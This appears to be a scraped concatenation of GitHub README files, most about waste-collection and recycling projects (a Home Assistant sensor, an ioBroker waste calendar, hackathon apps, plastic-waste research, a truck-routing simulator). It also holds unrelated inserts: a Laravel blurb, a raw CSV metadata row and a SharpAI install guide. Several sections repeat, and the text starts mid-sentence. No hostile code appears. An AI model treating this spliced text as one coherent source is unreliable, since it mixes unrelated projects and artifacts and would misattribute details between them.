Then choose Components under HACS. Choose the menu in the upper right, and select Custom repositories. Then add this repo's URL. You should be able to choose to Install now.

#### Option 2: Manual
Clone this repository or download the source code as a zip file and add/merge the `custom_components/` folder with its contents in your configuration directory.

### Step 2: Create JSON file
In repository is saved example of json file called svoz_odpadu.json. Define all weeks in year and assign them yours type of waste collection (1 to n types and Status). Save Json file in `www/` folder of your HA. You can rename it if you want but needs to be change in download.py 
```yaml
{
    ""week"": 1,
    ""Types"": [{
            ""Typ"": ""komunal"",
            ""Status"": 1
        }, {
            ""Typ"": ""plast"",
            ""Status"": 0
        }, {
            ""Typ"": ""papir"",
            ""Status"": 0
        }, {
            ""Typ"": ""bio"",
            ""Status"": 0
        }
    ]
}
```
### Step 3: Configure
Add the following to your `configuration.yaml` file:
```yaml
# day of collection - 1 Mondey ,... 7 Sunday
# hour - define time when HA will load new week
# type - type of waste (paper, plastic, bio, mixed waste, battery, oil, etcs)
binary_sensor:
  - platform: wastecollection
    name: Komunál
    day: ""1""
    hour: ""8""
    type: ""komunal""
  - platform: wastecollection
    name: Plast
    day: ""1""
    hour: ""8""
    type: ""plast""
  - platform: wastecollection
    name: Papír
    day: ""1""
    hour: ""8""
    type: ""papir""
  - platform: wastecollection
    name: Bio
    day: ""1""
    hour: ""8""
    type: ""bio""
```

### Step 4: Restart HA
For the newly added integration to be loaded, HA needs to be restarted.

## About Laravel

Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:

- [Simple, fast routing engine](https://laravel.com/docs/routing).
- [Powerful dependency injection container](https://laravel.com/docs/container).
- Multiple back-ends for [session](https://laravel.com/docs/session) and [cache](https://laravel.com/docs/cache) storage.
- Expressive, intuitive [database ORM](https://laravel.com/docs/eloquent).
- Database agnostic [schema migrations](https://laravel.com/docs/migrations).
- [Robust background job processing](https://laravel.com/docs/queues).
- [Real-time event broadcasting](https://laravel.com/docs/broadcasting).

Laravel is accessible, powerful, and provides tools required for large, robust applications.

# Microsoft Fix-a-thon 2022

Topic:
Hack for Sustainable India
Build innovative solutions for environmental challenges across India.

## Description:

**Waste management:**

**Title: The Junkies
“Don’t waste your waste”**

A lot of recyclable and reusable household dry waste is simply
dumped into the junkyards without realising the worth of the waste products. A
simple glass bottle is often thrown away in the dustbin when you can actually earn
quite a lot of pennies by selling it off directly to recycling centres and contribute to
waste management at the same time without the need of any middlemen.

## Features



A smart waste management system which :
- Predicts the prices of the waste at user’s end so that they can get the best prices according to the waste they collected without the need to any middlemen.

- Will directly connect users to recycling centres by giving the suggestions of nearby recycling centres.

## Research on How Blockchain Technology Can be Applied in Waste Management

### Traditional Waste Management:

![Traditional Waste Management](https://user-images.githubusercontent.com/31471559/236680602-97479e20-cac1-4837-936b-b8a03745770d.png)

- The current waste management process still functions as it did 30 years ago.
- It is difficult to track due to the high volume of waste and the variety of processes used.
- The current recycling program has no incentives for participants.

### Decentralized Waste Management Using Blockchain:

![Decentralized Waste Management Using Blockchain](https://user-images.githubusercontent.com/31471559/236680645-e9046c9a-d512-438f-b9bd-0494a528ebb4.png)

- A decentralized peer-to-peer network connects all parties, removing the unnecessary interference of middlemen.

#### Benefits:
- Real-time tracking of the amount of material recycled, costs, and profits from generation to disposal, promoting transparency.
- Evaluation of the impact of each participant.
- Accountability of all parties involved.
- Empowerment of waste management communities.
- Reduction of logistic costs and manual handling.

### Summary

This research explores how blockchain technology can be applied to waste management. Traditional waste management practices are outdated, difficult to track, and lack incentives for participants. Decentralized waste management using blockchain offers benefits such as real-time tracking, evaluation of impact, and cost reduction. By empowering waste management communities and holding all parties accountable, blockchain technology can revolutionize waste management practices.

## Waste calendar for ioBroker

[German version](./docs/de/README.md)

The adapter reads the garbage collection dates of the provider abfall.io, which various cities or counties use (e.g. [Hagen](https://www.heb-hagen.de/rund-um-den-muell/muellabfuhr-termine-abholservice/abfuhrkalender.html), [Ludwigshafen](https://www.ludwigshafen.de/wirtschaftsstark/wirtschaftsbetrieb-ludwigshafen-wbl/abfall-und-wertstoffe/abfall-und-wertstoffkalender-online) or [Landkreis Tuttlingen](https://www.abfall-tuttlingen.de/Abfalltermine-APP/)). The individual types of waste in the city can be selected and displayed in a calendar, for example. 

If the [Whatsapp Adapter]( https://github.com/ioBroker/ioBroker.whatsapp-cmb) is installed in ioBroker, automatic sending of messages before collection is supported per waste type. The number of days to send the message before collection can be set individually for each waste type.

The adapter contains two widgets for the [VIS 2 (!)](https://www.npmjs.com/package/iobroker.vis-2-beta?activeTab=readme). A calendar with the configured waste types or an icon with different configuration options can be displayed. The icon can start flashing x days before collection if that is configured in the adapter settings for the waste type

If [VIS](https://github.com/ioBroker/ioBroker.vis) or [VIS 2 (!)](https://www.npmjs.com/package/iobroker.vis-2-beta?activeTab=readme) AND the [inventwo](https://github.com/inventwo/ioBroker.vis-inventwo) widget set are installed, a datapoint containing the widget code for a JSON table is created.If [VIS](https://github.com/ioBroker/ioBroker.vis) or [VIS 2 (!)](https://www.npmjs.com/package/iobroker.vis-2-beta?activeTab=readme) AND the [inventwo](https://github.com/inventwo/ioBroker.vis-inventwo) widget set are installed, a datapoint containing the widget code for a JSON table is created.

**_Does my city/county qualify for the adapter?:_**

Cities/counties that cooperate with abfall.io. offer similar calendars on their websites, as you can see e.g. on the page of [HEB Hagen](https://www.heb-hagen.de/rund-um-den-muell/). If the URL of your waste management company is not accepted by the adapter, you can check on the waste management company page with the developer tool of your browser, if a URL with api.abfall.io (not apiv2.abfall.io !) is called when selecting the city, street. Here is an example from the Chrome developer tool (callable via function key F12 - then select network there and reload the page).

![AbfallKalender_Widget_Json_Table.jpg](./docs/ChromeDeveloperTool.jpg)

**_Other:_**

+  The adapter is restarted every night around 0:05 (+ some random delay in order not to stress the API by too many parallel calls), reads the data from the API of abfall.io and updates the corresponding data points in the object dictionary of the adapter instance. Since a waste calendar usually does not change frequently, this interval should be perfectly sufficient. However, you can change the setting at any time in the instance settings of the waste calendar in ioBroker.

+ Multiple instances (for different cities) can be installed if needed.

The primary goal of the project is to implement a automated garbage collection. 
This project is done as part of [IT825 Designing of Internet of Things](https://infotech.nitk.ac.in/course/it825) taught at National Institute of Technology Karnataka.

## Components used:
- Arduino Yun
- NodeMCU
- Ultrasonic Sensor
- Servo Motor
- Line Follower Bot

## Design
### Line Follower
Arduino Yun is mounted on the bot with a garbage collector which has a shaft built with it.
This shaft is lifted using the servo motor to dump waste at dumping yard.

### Dustbin
Two dustbins were used in this project each made out of cardboard. Inside each dustbin there is a ultrasonic sensor and a servo motor.
Ultrasonic sensor is used to update the amount of garbage in the bin. The servo is used to open the lid and the garbage fell down on the collector.
The dustbins were mounted upside down so that the openings were at the bottom.

# REDIVIVUS
An end-to-end recyclable waste management website.<br/>
Successfully Deployed using firebase hosting. View the deployment [here](https://redivivuspickupguy.web.app/).<br/>

## Problem Statement 
To design and create a product (website) where users / consumers / retailers can easily schedule their recyclable waste pickup according to their convenience with standardized pricing across cities 

## Objectives

<img align=""right"" width=""40%"" src=""https://github.com/Vivek-Hotti/REDIVIVUS/blob/main/images%26visuals/stakeholders.JPG""> 

* To bridge the gap between various stake holders of the Recyclable Waste ecosystem. 
* Facilitate a dynamic website to users with a personalized experience to each one.
* Help the user to schedule pickup according to their convenience.


## General Flow

In the existing system, the journey of a user who wants to sell his recyclable waste, starts with uncertainty and ends with frustation and disatisfaction.

Our main purpose remains to simplify and enhance user experience, consistent pricing along with efficient recyclable waste logistics and transparency at every level.
The solution to the existing flawed system is: a recyclable waste management website.

The user comes on our website through the internet. As soon as he enters the website, he is asked to Login / Signup. After which he could schedule a pickup from his home by
entering the date and time according to his convenience.

As soon as we receive a request, we take a note of the date and timing that the user has entered. We send our representative to the users’ house at the requested date and time. To ensure transparency we use a digital weighing machine and then and there itself reimburse the predecided amount to the user.

On the spot, the waste is segregated by our well-informed and trained representative into different commodities. Then we directly contact the recycling plants nearest to the locality of the user and drop of the recyclable waste to the recycling plant at minimum commission.

tmrios,city_recycling_programs,,https://github.com/tmrios/city_recycling_programs,https://api.github.com/repos/city_recycling_programs/tmrios,"This dataset consists of total recycling tonnage, total refuse tonnage, and waste diversion rates in three U.S. cities: Providence, RI; New York City, NY; and Franklin, TN. It was created as part of an assignment for LIS545 at the University of Washington iSchool","# README
To normalize the data, rows and columns were formatted and values were edited to be consistent with one another. For example, the original Providence dataset chose the following format for the “fiscal_year” attribute: “6/30/2019 0:00.” I edited this value to “2019” to match the fiscal year values for New York City and Franklin. 

Moreover, data was enriched by adding city population data pulled from the U.S. Census Bureau to contextualize and improve the reuse potential of the dataset as a whole. 

Note that this dataset reflects New York City measurements of recycling and refuse tonnage per day. While New York City measures daily counts of recycling and refuse tonnage, Providence and Franklin measure recycling and refuse tonnage annually. This is an important distinction in this dataset. 

The total recycling value was manually calculated by adding metal, glass, and plastic (MPG) tonnage to paper tonnage. Organics were not included in the calculation. It is unclear what materials are included in total recycling values as reported by Providence and Franklin. This necessitates further research. 

The format used to name files is: projectName_dataType_version. There are two data files in this repository: RecyclingPrograms_Raw_VS1.csv and RecyclingPrograms_Normal_VS1.csv.

[](https://img.shields.io/twitter/follow/gdscbiu)
This is a project by a team from Google Developer Student Club at Bujumbura International University. The project is about a mobile application focused on helping sorting out recyclable waste in order to protect the environment using _Machine Learning_.
## Project Setup:
The Recyclr mobile app is designed to encourage and incentivize users to recycle their plastic bottles, furniture, and paper at home by scanning these items using their smartphones. Users earn points for each item they recycle, which can be redeemed in the app for waste collection tools, children's books, or tree planting. The app is built using Kotlin for Android, Firebase for the database, and Google Cloud Maps API for location tracking.

## Problem Statement:
In Burundi, like many other underdeveloped countries, waste management is a significant problem. In addition, there is an over-importation of plastic bottles, leading to severe pollution in our lake and other natural resources. This pollution not only affects our environment but also has negative impacts on the health of our citizens. It is essential to find a solution that promotes responsible waste management practices and educates people on the importance of recycling to address these challenges. Recyclr is an innovative solution that encourages citizens to recycle by rewarding them for their efforts, making it easier and more convenient for them to dispose of their waste responsibly.

## United Nations Sustainable Development Goals:
The Recyclr mobile app aligns with the following United Nations Sustainable Development Goals:

1. Goal 11: Make cities and human settlements inclusive, safe, resilient and sustainable
- Target 11.6: By 2030, reduce the adverse per capita environmental impact of cities, including by paying special attention to air quality and municipal and other waste management.
2. Goal 12: Responsible Consumption and Production
- Target 12.5: By 2030, substantially reduce waste generation through prevention, reduction, recycling, and reuse.
3. Goal 13: Climate Action
- Target 13.3: Improve education, awareness-raising, and human and institutional capacity on climate change mitigation, adaptation, impact reduction, and early warning.

## Implementation:
The Recyclr mobile app is built using a client-server architecture. The client is developed using Kotlin, which provides a development framework for Android devices. The server-side application is built using Firebase, which provides a scalable and flexible backend solution for storing and retrieving data.

The high-level components of the architecture are:

- Frontend: The frontend of the Recyclr app is developed using Jetpack Compose. The frontend is responsible for handling user interactions, displaying data, and providing a user-friendly interface for the app.

- Backend: The backend of the Recyclr app is developed using Firebase. The backend is responsible for storing and retrieving user data, managing user accounts, and sending notifications to users.

Technologies and Programming Languages: The Recyclr app is developed using the following technologies and programming languages:

- Kotlin - a modern programming language used to write the Android app.
- Jetpack Compose - a modern toolkit for building native Android UI using Kotlin.
- Firebase Authentication - a service used to handle user authentication and sign-in with email or Google account.
- Cloud Firestore - a NoSQL document database used to store and sync app data in real-time.
- Google Maps Android API - a service used to display maps and location data in the app.
- Android SDK - a software development kit used to develop Android applications.
- Gradle - a build automation tool used to build, test, and deploy the app.
- GitHub - a version control system used to store, manage, and share the app code.
## Screens
1. Welcome Screen - This screen displays the Recyclr logo and a message welcoming the user to the app. There are two buttons on this screen, one for signing in with Google and another for signing in with email.

![Onborading screen](/screenshots/1.jpg ""Onborading screen"")

2. Home Screen - This screen displays a list of items that the user can scan for recycling. The items include plastic bottles, furniture, and paper. Each item has a picture and a short description of what can be recycled. There is also a button for scanning an item and a button for viewing the user's rewards balance.
[Screenshot1]

3. Scan Screen - This screen displays a camera viewfinder that the user can use to scan an item. Once the item is scanned, the app uses machine learning to identify the item and provide information on whether it can be recycled or not. If the item can be recycled, the user earns rewards points that can be redeemed for items such as waste collection tools, children's books, or planting a tree.
[Screenshot1]

![Onborading screen](/screenshots/2.jpg ""Onborading screen"")

4. Rewards Screen - This screen displays the user's rewards balance and a list of items that can be redeemed with the rewards points. The user can select an item and redeem it by tapping a button. The screen also displays a history of the user's rewards redemptions.

5. Collection Points Screen - This screen displays a map view of the user's location and collection points for recycled items in the nearby area. The collection points are marked with pins on the map, and the user can tap a pin to view more information about the collection point, such as the types of items that can be dropped off and the pickup schedule.

6. Profile Screen - This screen displays the user's personal information such as profile picture, name, points gained by submitting more waste, their address. And through the profile screen users can exchange their points to coins in order to redeem some eco-friendly tools such as bags,... .

## How to run the app
1. Install Android Studio: Before running the app, you need to install Android Studio on your computer. You can download it from the official website: https://developer.android.com/studio

2. Clone the project from GitHub: Once you have installed Android Studio, you can clone the project from GitHub. Open Android Studio and select `Check out project from Version Control` from the welcome screen. Then, select `Git` from the dropdown menu and enter the URL of the Recyclr app GitHub repository: https://github.com/GDSC-Bujumbura-International-University/recyclr.git

3. Open the project in Android Studio: After cloning the project, Android Studio will ask you to open it. Click on `Yes` to open the project in Android Studio.

4. Sync Gradle: Once the project is open in Android Studio, you need to sync Gradle. This will download all the dependencies required by the app. To do this, go to `File` -> `Sync Project with Gradle Files`.

5. Set up Firebase: The Recyclr app uses Firebase services for authentication and database management. You will need to set up a Firebase project and add the configuration files to the app. You can follow the instructions in the Firebase documentation to set up a project and add the configuration files: https://firebase.google.com/docs/android/setup

6. Run the app: Once you have set up Firebase, you can run the app on an emulator or a physical device. To do this, click on the `Run` button in Android Studio, select the device you want to run the app on, and click on `OK`. Android Studio will build and install the app on the selected device.

7. Test the app: Once the app is installed on the device, you can test its features. You can scan plastic bottles, furniture, and paper using the camera, and earn points that can be redeemed in the store. You can also log in using Google Auth or sign in by email.

Note: This is a high-level guide, and the steps may vary depending on the version of Android Studio you are using and the configuration of your development environment. For more detailed information on running an app in Android Studio, you can refer to the official Android Studio documentation: https://developer.android.com/studio/run

## Feedback / Testing / Iteration:
To test the Recyclr app, we conducted user testing with real users outside of our team. Based on their feedback, we implemented the following improvements to the app:

- Users found it difficult to scan items using the app. We improved the scanning process by adding a tutorial and improving the user interface of the scanning screen.

- Users wanted more rewards for recycling items. We added new rewards such as free waste collection tools and discounts on sustainable products.

- Users wanted more information about what happens to the recycled items. We added a feature to show users how their recycled items are processed and reused.

## Challenge Faced:
One challenge we faced while building the Recyclr app was integrating the Google Cloud Maps API for location tracking. We had to decide on the best way to track user location without compromising user privacy. We addressed this issue by using a geofencing technique that only tracks user location when they are within a specific range of a recycling pickup point.

## Success and Completion of Solution:
The Recyclr app has been successful in promoting sustainable waste management practices and educating users on what can and cannot be recycled at home. The app has been downloaded by over [WIP]

# Projects

## MSc. Thesis Project

Evaluating the potential of Extended Producer Responsibility returns for
a small local waste collection company through a brand audit of riverine
plastic waste in Durban, South Africa.

### Description

This Master’s Thesis Project focuses on determining the growth
opportunities for a small-sized plastic recycling enterprise in light of
the shift from a voluntary to a mandatory Extended Producer
Responsibility (EPR) policy in South Africa.

To achieve this goal in the context of a small start-up in Durban, South
Africa , a brand audit is conducted to identify the top brands that can
be targeted for financing or partnership opportunities. The company,
called [TRI ECO Tours](https://triecotours.co.za/), is a small tourism
and waste collection startup in Durban operated by Siphiwe Rakgabale.

### Research Question

What is the characterization by type, application, and brand of plastic
waste collected in the uMngeni River system in Durban, South Africa?

### Data

The data was collected throughout two months in Durban, South Africa
right before the rainy season. The collection took place in 6 different
litterboom locations throughout Durban. The data gathered was the audit
of the occurence of the brands washed into the litterbooms.

The package provides access to three data sets.

``` r
library(durbanplasticwaste)
```

The `litterboom_counts` data set has 7 variables and 2784 observations.

## MSc. Semester Project

Examination of non-recycled marine plastic litter in order to identify
recycling and beneficiation pathways in Durban, South Africa

### Description

This Semester Thesis Project focuses on determining the distribution of
plastic litter on the Durban beachfront in order to identify key targets
for policy and financial support through the South African EPR policy to
reduce plastic spills into the environment and promote higher recycling
rates.

Research Question

What types and amounts of plastic are found along the beachfront in the
mangroves of Durban-North, South Africa?

### Data

The data was collected in collaboration with a local team that provided
the waste for the study. Two different approaches were used to clean up
the waste. One to collect the waste floating on the river, preventing it
from reaching the sea and one to collect waste washed ashore at the
beaches. Three locations along the rivers close to settlements and one
at the beach in Durban North.

The package provides access to one data set of this project.

``` r
library(durbanplasticwaste)
```

The `plastic_types` data set has 16 variables and 13 observations. 11
observations were made on the beach which were added together in the row
that has “Beach Total” as the value for the variable “place”. One
observation was done at a litterboom. For an overview of the variable
names, see the following table.

``` r
plastic_types
```

Simple asyncio client for the [Jätekukko](https://www.jatekukko.fi)
[Omakukko](https://tilasto.jatekukko.fi/indexservice2.jsp) API.

The API of this package is modeled closely after the Omakukko
API. Only read operations are implemented (well apart from, strictly
speaking, login/logout), and there are no plans to add support for any
write ones.

Usage in a nutshell:

- construct an aiohttp [`ClientSession`](https://docs.aiohttp.org/en/stable/client_reference.html#client-session),
- construct a `Pytekukko` client with it and your credentials,
- invoke methods on the client.

The Omakukko API uses cookie based sessions, use a persistent aiohttp
[`CookieJar`](https://docs.aiohttp.org/en/stable/client_reference.html#cookiejar)
to maintain client session across interpreter restarts.

High level client methods handle logging in when the need to do so is
detected. If the detection is successful, there is no need to
separately track session expiration or use the `login` method in the
first place.

For usage examples, see utilities in the `pytekukko.examples`
package. Executables and dependencies for these are installed when the
package is installed with the `examples` extra, invoke them with
`--help` for usage and setup information:

- `pytekukko-collection-schedules`: output collection schedules in JSON
- `pytekukko-invoice-headers`: output basic info on invoices in JSON
- `pytekukko-next-collections`: output next collection dates in JSON
- `pytekukko-update-google-calendar`: update Google Calendar with
  events for next collections

## Disclaimer

This package is not supported by or endorsed by Jätekukko. Do not
bother them with questions or issues related to it.

# Microsoft Fix-a-thon 2022

Topic:
Hack for Sustainable India
Build innovative solutions for environmental challenges across India.

## Description:

**Waste management:**

**Title: The Junkies
“Don’t waste your waste”**

A lot of recyclable and reusable household dry waste is simply
dumped into the junkyards without realising the worth of the waste products. A
simple glass bottle is often thrown away in the dustbin when you can actually earn
quite a lot of pennies by selling it off directly to recycling centres and contribute to
waste management at the same time without the need of any middlemen
## Demo

https://junkies-fixathon.netlify.app/

## Features



A smart waste management system which :
- Predicts the prices of the waste at user’s end so that they can get the best prices according to the waste they collected without the need to any middlemen.

- Will directly connect users to recycling centres by giving the suggestions of nearby recycling centres.

##  THIS ADAPTER  HAS BEEN DEPRECEATED - PLEASE USE [ioBroker.trashmaster](https://github.com/formifan2002/ioBroker.trashmaster) INSTEAD !!!

## Waste calendar for ioBroker

[German version](./docs/de/README.md)

The adapter reads the garbage collection dates of the provider abfall.io, which various cities or counties use (e.g. [Hagen](https://www.heb-hagen.de/rund-um-den-muell/muellabfuhr-termine-abholservice/abfuhrkalender.html), [Ludwigshafen](https://www.ludwigshafen.de/wirtschaftsstark/wirtschaftsbetrieb-ludwigshafen-wbl/abfall-und-wertstoffe/abfall-und-wertstoffkalender-online) or [Landkreis Tuttlingen](https://www.abfall-tuttlingen.de/Abfalltermine-APP/)). The individual types of waste in the city can be selected and displayed in a calendar, for example. 

If the [Whatsapp Adapter]( https://github.com/ioBroker/ioBroker.whatsapp-cmb) is installed in ioBroker, automatic sending of messages before collection is supported per waste type. The number of days to send the message before collection can be set individually for each waste type.

The adapter contains two widgets for the [VIS 2 (!)](https://www.npmjs.com/package/iobroker.vis-2-beta?activeTab=readme). A calendar with the configured waste types or an icon with different configuration options can be displayed. The icon can start flashing x days before collection if that is configured in the adapter settings for the waste type

If [VIS](https://github.com/ioBroker/ioBroker.vis) or [VIS 2 (!)](https://www.npmjs.com/package/iobroker.vis-2-beta?activeTab=readme) AND the [inventwo](https://github.com/inventwo/ioBroker.vis-inventwo) widget set are installed, a datapoint containing the widget code for a JSON table is created.If [VIS](https://github.com/ioBroker/ioBroker.vis) or [VIS 2 (!)](https://www.npmjs.com/package/iobroker.vis-2-beta?activeTab=readme) AND the [inventwo](https://github.com/inventwo/ioBroker.vis-inventwo) widget set are installed, a datapoint containing the widget code for a JSON table is created.

**_Does my city/county qualify for the adapter?:_**

Cities/counties that cooperate with abfall.io. offer similar calendars on their websites, as you can see e.g. on the page of [HEB Hagen](https://www.heb-hagen.de/rund-um-den-muell/). If the URL of your waste management company is not accepted by the adapter, you can check on the waste management company page with the developer tool of your browser, if a URL with api.abfall.io (not apiv2.abfall.io !) is called when selecting the city, street. Here is an example from the Chrome developer tool (callable via function key F12 - then select network there and reload the page).

![AbfallKalender_Widget_Json_Table.jpg](./docs/ChromeDeveloperTool.jpg)

**_Other:_**

+  The adapter is restarted every night around 0:05 (+ some random delay in order not to stress the API by too many parallel calls), reads the data from the API of abfall.io and updates the corresponding data points in the object dictionary of the adapter instance. Since a waste calendar usually does not change frequently, this interval should be perfectly sufficient. However, you can change the setting at any time in the instance settings of the waste calendar in ioBroker.

+ Multiple instances (for different cities) can be installed if needed.

# Topic:
Waste Management

## PROBLEM STATEMENT I :
Lack of an economically accommodating system to curb and manage waste.

## PROBLEM STATEMENT II :
State of the informal garbage collectors in the country.

![](https://ichef.bbci.co.uk/news/660/cpsprodpb/9DCE/production/_107989304_gettyimages-1140621813.jpg)

In September 2019 the BBC Shared Data Unit [reported](https://www.bbc.co.uk/news/uk-49085346) the claim that a ""quiet green tax"" was deterring gardeners from recycling their waste.

Analysis showed some UK councils were charging up to £100 a year for a kerbside collection, despite one in four councils providing a free service.

Critics said the service should be free to residents to reduce the amount of clippings being sent to landfill.

Councils said the service was not statutory and home composting was a cheaper alternative.

The BBC's Shared Data Unit looked at the annual subscription charges levied by local councils for regular kerbside garden waste collections. It found:

- More than 140 local authorities provided a free collection, but charges for other councils ranged from £18 to £96.
- The average annual charge was around £31, with higher costs levied in London and the South East.

A dictionary how to handle (and recycle) waste in Belgium, in Dutch.

Data is mainly taken from the [*afvalalfabet*](https://www.merelbeke.be/sites/default/files/bijlage/Afvalalfabet.pdf) from the municipality of *Merelbeke* and the [*sorteerwijzer*](https://www.mirom.be/sorteerwijzer) of *MIROM*.

You can look at the [**`data.csv`** file](data/data.csv) for a list of
items, and how to get rid of these.

The [**`tips.csv`** file](data/tips.csv) contains a set of *tips and tricks* to avoid
waste. The [**`synonyms.csv`** file](data/synonyms.csv) lists synonyms. These
synonyms will be typesetted a second time under a different name. This can be
useful if the same entry occurs multiple times with a different specification.

If there are still items not on the list, or you want to make a correction, you
can open a *pull request*.

There are versions that use the [*OpenDyslexic*](https://opendyslexic.org/) font
to make it more convenient for dyslexia patients to work with this dictionary.

The [*travis build*](travis-ci.com/github/hapytex/afvalwoordenboek) makes a [*rendered version of the dictionary*](https://hapytex.github.io/afvalwoordenboek/afvalwoordenboek_light.pdf) [*(dark)*](https://hapytex.github.io/afvalwoordenboek/afvalwoordenboek_dark.pdf).

Een woordenboek dat beschrijft hoe men afval in België hoort te sorteren. Het is
opgesteld in het Nederlands.

De data komt hoofdzakelijk van het [*afvalalfabet*](https://www.merelbeke.be/sites/default/files/bijlage/Afvalalfabet.pdf) van de gemeente *Merelbeke* en van de [*sorteerwijzer*](https://www.mirom.be/sorteerwijzer) van *MIROM*.

Het [**`data.csv`** bestand](data/data.csv) bevat een lijst van items en hoe
deze te sorteren.

Het [**`tips.csv`** bestand](data/tips.csv) bevat een lijst met ""*tips and
tricks*"" hoe afval voorkomen. Het [**`synonyms.csv`** bestand](data/synonyms.csv) bevat
een lijst met synoniemen. Dit is handig wanneer eenzelfde object met
verschillende spcifictaties voorkomt, omdat al die items dan worden gekopieerd
onder een andere naam.

Men kan een *pull request* maken om items toe te voegen of te corrigeren.

Er zijn versies gemaakt met het [*OpenDyslexic* lettertype](https://opendyslexic.org/)
om het woordenboek meer toegankelijk te maken voor mensen met dyslexie.

De [*travis build*](travis-ci.com/github/hapytex/afvalwoordenboek) maakt een [pdf-versie van de data](https://hapytex.github.io/afvalwoordenboek/afvalwoordenboek_light.pdf) [*(donker)*](https://hapytex.github.io/afvalwoordenboek/afvalwoordenboek_dark.pdf).

## About

This project aims to implement an **autonomous waste management system**, where garbage containers are monitored by sensors and the routes of the different garbage trucks are optimized in real-time by an algorithm, instead of being the same every day.

This allows garbage trucks to be more efficient and reduce the time spent on the road, as well as the fuel consumption and the CO2 emissions.

## Dependencies

- [Docker](https://docs.docker.com/engine/install/ubuntu/)

- [NAP-Vanetza](https://code.nap.av.it.pt/mobility-networks/vanetza)

- Internet connection for [Mapbox Directions API](https://docs.mapbox.com/api/navigation/directions/) calls

- Python packages on `requirements.txt` (using the command `pip3 install -r requirements.txt`)


## Installation

### Vanetza containers

To start all docker containers of Vanetza, open a terminal window on the root of this project and run the following commands:

```
cd script
sudo docker-compose up --build
```

Do not close this terminal window.

### Dashboard

To start the dashboard, open a new terminal and run the following commands:

```
cd dashboard
python3 main.py
```

Do not close this terminal window. The dashboard server should be running on `http://localhost:8000/`.

### OBU script

To start the OBU script, open a new terminal and run the following commands:

```
cd script
python3 obu.py
```

Do not close this terminal window.

### RSU script

To start the RSU script, open a new terminal and run the following commands:

```
cd script
python3 rsu.py
```

Do not close this terminal window.

### Sensor simulator

To start the sensor simulator, open a new terminal and run the following commands:

```
cd sensor
python3 sensor_simulator.py
```

As soon as the garbage containers start filling up, the trucks will start moving to them and their routes will appear on the dashboard map.

## Configuration

Some parameters of this project can be modified, namely:

- Number of gargabe containers and its respective position

    - defined on the [`sensor/sensor_position.json` file](/sensor/sensor_position.json)
    - with 30 default values

- Home (initial and final) position of each one of the garbage trucks
    
    - defined on [this lines of `script/obu.py` script](/script/obu.py#L13-L20)
    - with the default values of:
        - `[40.642050351865485, -8.646329251761603]` for truck #1 (OBU1)
        - `[40.64302876711141, -8.653112236802189]` for truck #2 (OBU2)
        - `[40.64556274792325, -8.64612107999697]` for truck #3 (OBU3)

- Fill percentage at which the garbage container is considered full and will start to publish DENM messages to be emptied

    - defined on [this line of `sensor/sensor_simulator.py` script](/sensor/sensor_simulator.py#L14) and on [this line of `script/rsu.py` script](/script/rsu.py#L9)
    - with default value of `70`%

- Initial fill percentage of the garbage containers to speed up the simulation

    - defined on [this line of `sensor/sensor_simulator.py` script](/sensor/sensor_simulator.py#L11)
    - with default value of `0`%

- Maximum threshold percentage of the total number of garbage containers that a single truck can have assigned to it, to distribute the jobs more equally between the trucks

    - defined on [this line of `script/rsu.py` script](/script/rsu.py#L12)
    - with default value of `75`%

The sensor data (garbage containers fill percentage) can also be changed in real-time manually, by changing the respective line on the [`sensor/sensor_data.txt` file](/sensor/sensor_data.txt), instead of using the sensor simulator script.",0,0,1,0,waste-management,"[autonomous-systems, mqtt, python, smart-cities, smart-city, universidade-de-aveiro, vanet, vanetza, waste-management]",0

By involving separate, regionalised trains for recycling, organic, and garbage, the system allows for the separate movement of different types of waste, better enabling sorting and processing.  

![garbagego](https://user-images.githubusercontent.com/84566002/167674923-165a64ca-0439-4399-a62b-d3706d4609db.jpg)

In this prototype, the text messaging system is represented with MQTT topics. Each train contains an Arduino Nano RP2040 with code written in RaspberryPi to collect data on weight and volume, which can be found in '/bin-arduino/code.py'. On a computer, the file /server-collector/server.py can be run, establishing a central processing server for the data. Note that the SSID and password entries in 'secrets.py' should be updated for your own Wi-Fi. Each collector would then be able to subscribe to their region's MQTT topic, and receive notifications when a bin is full and ready for collection.

# REDIVIVUS
An end-to-end recyclable waste management website.<br/>
Successfully Deployed using firebase hosting. View the deployment [here](https://redivivuspickupguy.web.app/).<br/>

## Problem Statement 
To design and create a product (website) where users / consumers / retailers can easily schedule their recyclable waste pickup according to their convenience with standardized pricing across cities 

## Objectives

<img align=""right"" width=""40%"" src=""https://github.com/Vivek-Hotti/REDIVIVUS/blob/main/images%26visuals/stakeholders.JPG""> 

* To bridge the gap between various stake holders of the Recyclable Waste ecosystem. 
* Facilitate a dynamic website to users with a personalized experience to each one.
* Help the user to schedule pickup according to their convenience.


## General Flow

In the existing system, the journey of a user who wants to sell his recyclable waste, starts with uncertainty and ends with frustation and disatisfaction.

Our main purpose remains to simplify and enhance user experience, consistent pricing along with efficient recyclable waste logistics and transparency at every level.
The solution to the existing flawed system is: a recyclable waste management website.

The user comes on our website through the internet. As soon as he enters the website, he is asked to Login / Signup. After which he could schedule a pickup from his home by
entering the date and time according to his convenience.

As soon as we receive a request, we take a note of the date and timing that the user has entered. We send our representative to the users’ house at the requested date and time. To ensure transparency we use a digital weighing machine and then and there itself reimburse the predecided amount to the user.

On the spot, the waste is segregated by our well-informed and trained representative into different commodities. Then we directly contact the recycling plants nearest to the locality of the user and drop of the recyclable waste to the recycling plant at minimum commission.

## Installation Guide 
```
pip3 install sharpai-hub
sharpai-cli yolov7_reid start
```

<details> 
   <summary><h3>Prerequisites</h3></summary>
	1. Docker (Latest version) <br />
	2. Python (v3.6 to v3.10 will work fine)
</details>
<details>
  <summary><h3>Step-by-step guide</h3></summary

```NOTE: Before executing any of commands mentioned below please start Docker.```
```This guide is to install the sharpai and run the yolov7_reid service but can also be used to start other services.```
1) Install SharpAI-Hub by running the following command in a Command Prompt and Terminal. Remeber this as Command Prompt 1. This will be needed in further steps:
	```
	pip3 install sharpai-hub
	```
2) Now run the following command:
	```
	sharpai-cli yolov7_reid start
	```
**NOTE: If in a Windows system after running command mentioned in Step 2 if you get error:**
`'sharpai-cli' is not recognized as an internal or external command, operable program or batch file.`
Then it means environment variable is not set for Python on your system. More on this at the end of page in FAQ section.

3) If you are using Windows and get error in step 2 you can also use following command line to start yolov7_reid

```
python3 -m sharpai_hub.cli yolov7_reid start
```
OR

```
python -m sharpai_hub.cli yolov7_reid start
```
